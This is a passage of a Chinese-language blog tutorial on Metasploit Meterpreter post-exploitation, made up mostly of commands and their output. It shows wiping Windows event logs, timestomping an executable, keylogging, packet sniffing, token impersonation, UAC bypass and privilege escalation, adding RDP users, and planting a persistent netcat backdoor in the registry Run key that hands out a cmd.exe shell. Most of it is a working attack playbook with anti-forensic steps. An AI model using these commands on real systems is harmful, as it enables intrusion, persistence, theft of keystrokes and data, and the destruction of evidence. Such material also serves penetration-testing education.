ASCOTBECC20\ascotbe  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>如果两个进程的权限不同，也就是说该进程没有要注入的进程权限高的话，是没办法写入到其他进程中去的,比如下面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; migrate 2192 </span><br><span class="line">[*] Migrating from 12116 to 2192...</span><br><span class="line">[-] Error running <span class="built_in">command</span> migrate: Rex::RuntimeError Cannot migrate into this process (insufficient privileges)</span><br><span class="line">meter</span><br></pre></td></tr></table></figure><p>如果权限相同的启动进程是可以注入的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; migrate 12032</span><br><span class="line">[*] Migrating from 180 to 12032...</span><br><span class="line">[*] Migration completed successfully.</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 12032</span><br></pre></td></tr></table></figure><h5 id="清除日志"><a href="#清除日志" class="headerlink" title="清除日志"></a>清除日志</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev <span class="comment">#清除windows中的应用程序日志、系统日志、安全日志，需要管理员权限</span></span><br></pre></td></tr></table></figure><p> 执行前</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/MSF/3.png?raw=true" alt="image-20200525135426413"></p><p>执行后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev</span><br><span class="line">[*] Wiping 4993 records from Application...</span><br><span class="line">[*] Wiping 2239 records from System...</span><br><span class="line">[*] Wiping 11222 records from Security...</span><br></pre></td></tr></table></figure><p>这里有一点要注意的就是，清除日志的话这边在安全和系统这两个地方还是会留着一条日志清除的日志</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/MSF/4.png?raw=true" alt="image-20200525135838480"></p><h4 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h4><h5 id="基本文件系统命令"><a href="#基本文件系统命令" class="headerlink" title="基本文件系统命令"></a>基本文件系统命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">getwd 或者<span class="built_in">pwd</span> <span class="comment"># 查看当前工作目录  </span></span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">cat c:\\lltest\\lltestpasswd.txt  <span class="comment"># 查看文件内容</span></span><br><span class="line">upload /tmp/hack.txt C:\\lltest  <span class="comment"># 上传文件到目标机上</span></span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/ <span class="comment"># 下载文件到本机上</span></span><br><span class="line">edit c:\\1.txt <span class="comment">#编辑或创建文件  没有的话，会新建文件</span></span><br><span class="line">rm C:\\lltest\\hack.txt</span><br><span class="line">mkdir lltest2  <span class="comment">#只能在当前目录下创建文件夹</span></span><br><span class="line">rmdir lltest2  <span class="comment">#只能删除当前目录下文件夹</span></span><br><span class="line">getlwd   或者 lpwd   <span class="comment">#操作攻击者主机 查看当前目录</span></span><br><span class="line">lcd /tmp   <span class="comment">#操作攻击者主机 切换目录</span></span><br></pre></td></tr></table></figure><h5 id="伪造时间戳"><a href="#伪造时间戳" class="headerlink" title="伪造时间戳"></a>伪造时间戳</h5><p>参数列表如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; timestomp c://</span><br><span class="line"></span><br><span class="line">Usage: timestomp &lt;file(s)&gt; OPTIONS</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -a &lt;opt&gt;  Set the <span class="string">&quot;last accessed&quot;</span> time of the file</span><br><span class="line">    -b        Set the MACE timestamps so that EnCase shows blanks</span><br><span class="line">    -c &lt;opt&gt;  Set the <span class="string">&quot;creation&quot;</span> time of the file</span><br><span class="line">    -e &lt;opt&gt;  Set the <span class="string">&quot;mft entry modified&quot;</span> time of the file</span><br><span class="line">    -f &lt;opt&gt;  Set the MACE of attributes equal to the supplied file</span><br><span class="line">    -h        Help banner</span><br><span class="line">    -m &lt;opt&gt;  Set the <span class="string">&quot;last written&quot;</span> time of the file</span><br><span class="line">    -r        Set the MACE timestamps recursively on a directory</span><br><span class="line">    -v        Display the UTC MACE values of the file</span><br><span class="line">    -z &lt;opt&gt;  Set all four attributes (MACE) of the file</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">timestomp -v C://2.txt   <span class="comment">#查看时间戳</span></span><br><span class="line">timestomp C://2.txt -f C://1.txt <span class="comment">#将1.txt的时间戳复制给2.txt</span></span><br></pre></td></tr></table></figure><p>把<strong>win.ini</strong>的时间戳赋值给<strong>VirtualAllocPlanB.exe</strong></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/MSF/5.png?raw=true" alt="image-20200525140626180"></p><h5 id="搜索文件"><a href="#搜索文件" class="headerlink" title="搜索文件"></a>搜索文件</h5><p>参数列表如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search -h</span><br><span class="line">Usage: search [-d dir] [-r recurse] -f pattern [-f pattern]...</span><br><span class="line">Search <span class="keyword">for</span> files.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -d &lt;opt&gt;  The directory/drive to begin searching from. Leave empty to search all drives. (Default: )</span><br><span class="line">    -f &lt;opt&gt;  A file pattern glob to search <span class="keyword">for</span>. (e.g. *secret*.doc?)</span><br><span class="line">    -h        Help Banner</span><br><span class="line">    -r &lt;opt&gt;  Recursivly search sub directories. (Default: <span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search -f *secret*.doc  <span class="comment">#全局搜索secret.doc这个文件</span></span><br></pre></td></tr></table></figure><h4 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h4><h5 id="基本网络命令"><a href="#基本网络命令" class="headerlink" title="基本网络命令"></a>基本网络命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   <span class="comment">#查看代理信息</span></span><br><span class="line">route   <span class="comment">#查看路由</span></span><br></pre></td></tr></table></figure><h5 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h5><p>参数列表如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -L &lt;opt&gt;  Forward: <span class="built_in">local</span> host to listen on (optional). Reverse: <span class="built_in">local</span> host to connect to.</span><br><span class="line">    -R        Indicates a reverse port forward.</span><br><span class="line">    -h        Help banner.</span><br><span class="line">    -i &lt;opt&gt;  Index of the port forward entry to interact with (see the <span class="string">&quot;list&quot;</span> <span class="built_in">command</span>).</span><br><span class="line">    -l &lt;opt&gt;  Forward: <span class="built_in">local</span> port to listen on. Reverse: <span class="built_in">local</span> port to connect to.</span><br><span class="line">    -p &lt;opt&gt;  Forward: remote port to connect to. Reverse: remote port to listen on.</span><br><span class="line">    -r &lt;opt&gt;  Forward: remote host to connect to.</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 <span class="comment">#将目标机的3389端口转发到本地6666端口</span></span><br></pre></td></tr></table></figure><p>接下来只需要连接本地的6666端口即可连上目标</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/MSF/6.png?raw=true" alt="image-20200525180719130"></p><h5 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h5><p>参数列表如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -h</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Usage:   run autoroute [-r] -s subnet -n netmask</span><br><span class="line">[*] Examples:</span><br><span class="line">[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  <span class="comment"># Add a route to 10.10.10.1/255.255.255.0</span></span><br><span class="line">[*]   run autoroute -s 10.10.10.1                 <span class="comment"># Netmask defaults to 255.255.255.0</span></span><br><span class="line">[*]   run autoroute -s 10.10.10.1/24              <span class="comment"># CIDR notation is also okay</span></span><br><span class="line">[*]   run autoroute -p                            <span class="comment"># Print active routing table</span></span><br><span class="line">[*]   run autoroute -d -s 10.10.10.1              <span class="comment"># Deletes the 10.10.10.1/255.255.255.0 route</span></span><br><span class="line">[*] Use the <span class="string">&quot;route&quot;</span> and <span class="string">&quot;ipconfig&quot;</span> Meterpreter commands to learn about available routes</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.159.0/24  <span class="comment">#添加到目标环境网络</span></span><br><span class="line">run autoroute –p  <span class="comment">#查看添加的路由</span></span><br></pre></td></tr></table></figure><p>然后可以利用<code>arp_scanner</code>、<code>portscan</code>等进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389</span><br></pre></td></tr></table></figure><h5 id="Socks4a代理"><a href="#Socks4a代理" class="headerlink" title="Socks4a代理"></a>Socks4a代理</h5><p><code>autoroute</code>添加完路由后，还可以利用<strong>msf</strong>自带的<code>sock4a</code>模块进行<code>Socks4a</code>代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/server/socks4a </span><br><span class="line">msf &gt; <span class="built_in">set</span> srvhost 127.0.0.1</span><br><span class="line">msf &gt; <span class="built_in">set</span> srvport 1080</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains.conf <span class="comment">#添加 socks4 127.0.0.1 1080</span></span><br></pre></td></tr></table></figure><p>最后<code>proxychains</code> 使用<strong>Socks4a</strong>代理访问</p><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>信息收集的脚本位于：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/post/windows/gather</span><br><span class="line">/usr/share/metasploit-framework/modules/post/linux/gather</span><br></pre></td></tr></table></figure><p>信息收集的脚本较多，仅列几个常用的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">run post/linux/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">run post/windows/gather/forensics/enum_drives <span class="comment">#查看分区</span></span><br><span class="line">run post/windows/gather/enum_applications <span class="comment">#获取安装软件信息</span></span><br><span class="line">run post/windows/gather/dumplinks   <span class="comment">#获取最近的文件操作</span></span><br><span class="line">run post/windows/gather/enum_ie  <span class="comment">#获取IE缓存</span></span><br><span class="line">run post/windows/gather/enum_chrome   <span class="comment">#获取Chrome缓存</span></span><br><span class="line">run post/windows/gather/enum_patches  <span class="comment">#补丁信息</span></span><br><span class="line">run post/windows/gather/enum_domain  <span class="comment">#查找域控</span></span><br></pre></td></tr></table></figure><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="getsystem"><a href="#getsystem" class="headerlink" title="getsystem"></a>getsystem</h5><p>工作原理：</p><ul><li><code>getsystem</code>创建一个新的<strong>Windows</strong>服务，设置为<strong>SYSTEM</strong>运行，当它启动时连接到一个命名管道。</li><li><code>getsystem</code>产生一个进程，它创建一个命名管道并等待来自该服务的连接。</li><li><strong>Windows</strong>服务已启动，导致与命名管道建立连接。</li><li>该进程接收连接并调用<code>ImpersonateNamedPipeClient</code>，从而为<strong>SYSTEM</strong>用户创建模拟令牌。</li></ul><p>然后用新收集的<strong>SYSTEM</strong>模拟令牌产生<strong>cmd.exe</strong>，并且我们有一个<strong>SYSTEM</strong>特权进程。</p><h5 id="bypassuac"><a href="#bypassuac" class="headerlink" title="bypassuac"></a>bypassuac</h5><p>内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/<span class="built_in">local</span>/bypassuac</span><br><span class="line">use exploit/windows/<span class="built_in">local</span>/bypassuac_injection</span><br><span class="line">use windows/<span class="built_in">local</span>/bypassuac_vbs</span><br><span class="line">use windows/<span class="built_in">local</span>/ask</span><br></pre></td></tr></table></figure><p>如使用bypassuac.rb脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/<span class="built_in">local</span>/bypassuac</span><br><span class="line">msf &gt; <span class="built_in">set</span> SESSION 2</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><h4 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h4><p>可先利用enum_patches模块收集补丁信息，然后查找可用的exploits进行提权，需要退出当前连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  <span class="comment">#查看补丁信息</span></span><br><span class="line">msf &gt; use exploit/windows/<span class="built_in">local</span>/ms13_053_schlamperei</span><br><span class="line">msf &gt; <span class="built_in">set</span> SESSION 2</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure><h4 id="远程桌面-amp-截屏"><a href="#远程桌面-amp-截屏" class="headerlink" title="远程桌面&amp;截屏"></a>远程桌面&amp;截屏</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enumdesktops  <span class="comment">#查看可用的桌面</span></span><br><span class="line">getdesktop    <span class="comment">#获取当前meterpreter 关联的桌面</span></span><br><span class="line">set_desktop   <span class="comment">#设置meterpreter关联的桌面  -h查看帮助</span></span><br><span class="line">screenshot  <span class="comment">#截屏</span></span><br><span class="line">use espia  <span class="comment">#或者使用espia模块截屏  然后输入screengrab</span></span><br><span class="line">run vnc  <span class="comment">#使用vnc远程桌面连接，这方法有点问题，上传了exe但是启动不了</span></span><br></pre></td></tr></table></figure><h5 id="enumdesktops"><a href="#enumdesktops" class="headerlink" title="enumdesktops"></a>enumdesktops</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; enumdesktops </span><br><span class="line">Enumerating all accessible desktops</span><br><span class="line"></span><br><span class="line">Desktops</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    Session  Station  Name</span><br><span class="line">    -------  -------  ----</span><br><span class="line">    1        WinSta0  Default</span><br></pre></td></tr></table></figure><h5 id="screenshot"><a href="#screenshot" class="headerlink" title="screenshot"></a>screenshot</h5><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/MSF/7.png?raw=true" alt="image-20200525160126036"></p><h5 id="espia模块"><a href="#espia模块" class="headerlink" title="espia模块"></a>espia模块</h5><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/MSF/8.png?raw=true" alt="image-20200525160250265"></p><h4 id="开启rdp-amp-添加用户"><a href="#开启rdp-amp-添加用户" class="headerlink" title="开启rdp&amp;添加用户"></a>开启rdp&amp;添加用户</h4><h5 id="getgui"><a href="#getgui" class="headerlink" title="getgui"></a>getgui</h5><p>参数列表如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run getgui –h</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.</span><br><span class="line">[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]</span><br><span class="line">Windows Remote Desktop Enabler Meterpreter Script</span><br><span class="line">Usage: getgui -u &lt;username&gt; -p &lt;password&gt;</span><br><span class="line">Or:    getgui -e</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -e        Enable RDP only.</span><br><span class="line">    -f &lt;opt&gt;  Forward RDP Connection.</span><br><span class="line">    -h        Help menu.</span><br><span class="line">    -p &lt;opt&gt;  The Password of the user to add.</span><br><span class="line">    -u &lt;opt&gt;  The Username of the user to add.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run getgui -e <span class="comment">#开启远程桌面</span></span><br><span class="line">run getgui -u lltest2 -p 123456   <span class="comment">#添加用户</span></span><br><span class="line">run getgui -f 6661 –e   <span class="comment">#3389端口转发到6661</span></span><br></pre></td></tr></table></figure><p>这种方法不推荐是用，容易创建失败</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/MSF/9.png?raw=true" alt="image-20200525171554701"></p><h5 id="enable-rdp"><a href="#enable-rdp" class="headerlink" title="enable_rdp"></a>enable_rdp</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp  <span class="comment">#开启远程桌面</span></span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 <span class="comment">#添加用户</span></span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=<span class="literal">true</span> LPORT=6662  <span class="comment">#将3389端口转发到6662</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/MSF/10.png?raw=true" alt="image-20200525171233929"></p><p>最后用工具连接成功</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/MSF/11.png?raw=true" alt="image-20200525171428486"></p><h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start  <span class="comment">#开始键盘记录</span></span><br><span class="line">keyscan_dump   <span class="comment">#导出记录数据</span></span><br><span class="line">keyscan_stop <span class="comment">#结束键盘记录</span></span><br></pre></td></tr></table></figure><p>这边要说一点就是，导出记录的话要在<code>keyscan_stop</code>命令之前，不然结束了就无法导出了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start</span><br><span class="line">Starting the keystroke sniffer ...</span><br><span class="line">meterpreter &gt; keyscan_dump  <span class="comment">#每次转储后，命令都会打印出来，然后再次转储的话是从上一次键盘结束开始记录的</span></span><br><span class="line">Dumping captured keystrokes...</span><br><span class="line">fffff&lt;CR&gt;</span><br><span class="line">&lt;CR&gt;</span><br><span class="line">&lt;CR&gt;</span><br><span class="line">fff&lt;CR&gt;</span><br><span class="line">&lt;CR&gt;</span><br><span class="line">&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_stop</span><br><span class="line">Stopping the keystroke sniffer...</span><br></pre></td></tr></table></figure><h4 id="sniffer抓包"><a href="#sniffer抓包" class="headerlink" title="sniffer抓包"></a>sniffer抓包</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   <span class="comment">#查看网卡</span></span><br><span class="line">sniffer_start 2   <span class="comment">#选择网卡 开始抓包</span></span><br><span class="line">sniffer_stats 2   <span class="comment">#查看状态</span></span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  <span class="comment">#导出pcap数据包</span></span><br><span class="line">sniffer_stop 2   <span class="comment">#停止抓包</span></span><br></pre></td></tr></table></figure><h4 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h4><h5 id="参数列表如下"><a href="#参数列表如下" class="headerlink" title="参数列表如下"></a>参数列表如下</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter reg –h</span><br><span class="line">Usage: reg [<span class="built_in">command</span>] [options]</span><br><span class="line">Interact with the target machine<span class="string">&#x27;s registry.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OPTIONS:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    -d &lt;opt&gt;  The data to store in the registry value.#注册表中值的数据</span></span><br><span class="line"><span class="string">    -h        Help menu.</span></span><br><span class="line"><span class="string">    -k &lt;opt&gt;  The registry key path (E.g. HKLM\Software\Foo).#注册表键路径</span></span><br><span class="line"><span class="string">    -r &lt;opt&gt;  The remote machine name to connect to (with current process credentials#要连接的远程计算机名称（使用当前进程凭据）</span></span><br><span class="line"><span class="string">    -t &lt;opt&gt;  The registry value type (E.g. REG_SZ).#注册表值类型</span></span><br><span class="line"><span class="string">    -v &lt;opt&gt;  The registry value name (E.g. Stuff).#注册表键名称</span></span><br><span class="line"><span class="string">    -w        Set KEY_WOW64 flag, valid values [32|64].#设置32位注册列表还是64位</span></span><br><span class="line"><span class="string">COMMANDS:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    enumkey  Enumerate the supplied registry key [-k &lt;key&gt;]#枚举可获得的键</span></span><br><span class="line"><span class="string">    createkey  Create the supplied registry key  [-k &lt;key&gt;]#创建提供的注册表项</span></span><br><span class="line"><span class="string">    deletekey  Delete the supplied registry key  [-k &lt;key&gt;]#删除提供的注册表项</span></span><br><span class="line"><span class="string">    queryclass Queries the class of the supplied key [-k &lt;key&gt;]#查询键值数据</span></span><br><span class="line"><span class="string">    setval Set a registry value [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]#设置键值</span></span><br><span class="line"><span class="string">    deleteval  Delete the supplied registry value [-k &lt;key&gt; -v &lt;val&gt;]#删除提供的注册表值</span></span><br><span class="line"><span class="string">    queryval Queries the data contents of a value [-k &lt;key&gt; -v &lt;val&gt;]#查询值的数据内容</span></span><br></pre></td></tr></table></figure><h5 id="注册表设置nc后门"><a href="#注册表设置nc后门" class="headerlink" title="注册表设置nc后门"></a>注册表设置nc后门</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upload /Users/ascotbe/Downloads/netcat-1.11/nc.exe C:\\windows\\system32 <span class="comment">#上传nc,前面的是你要上传文件的位置</span></span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   <span class="comment">#枚举run下的key</span></span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d <span class="string">&#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27;</span> <span class="comment">#设置键值</span></span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   <span class="comment">#查看键值</span></span><br><span class="line">nc -v 192.168.0.142 443  <span class="comment">#攻击者连接nc后门</span></span><br></pre></td></tr></table></figure><p>设置成功</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/MSF/12.png?raw=true" alt="image-20200525173618434"></p><p>可以看到目标这边的注册表和进程都也启动了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/MSF/13.png?raw=true" alt="image-20200525180115233"></p><h4 id="令牌操纵"><a href="#令牌操纵" class="headerlink" title="令牌操纵"></a>令牌操纵</h4><h5 id="假冒令牌"><a href="#假冒令牌" class="headerlink" title="假冒令牌"></a>假冒令牌</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use incognito      </span><br><span class="line"><span class="built_in">help</span> incognito  <span class="comment">#查看帮助</span></span><br><span class="line">list_tokens -u    <span class="comment">#查看可用的token</span></span><br><span class="line">impersonate_token <span class="string">&#x27;NT AUTHORITY\SYSTEM&#x27;</span>  <span class="comment">#假冒SYSTEM token,或者用下面的</span></span><br><span class="line">impersonate_token NT\ AUTHORITY\\SYSTEM <span class="comment">#不加单引号 需使用\\</span></span><br><span class="line">execute -f cmd.exe -i –t    <span class="comment"># -t 使用假冒的token 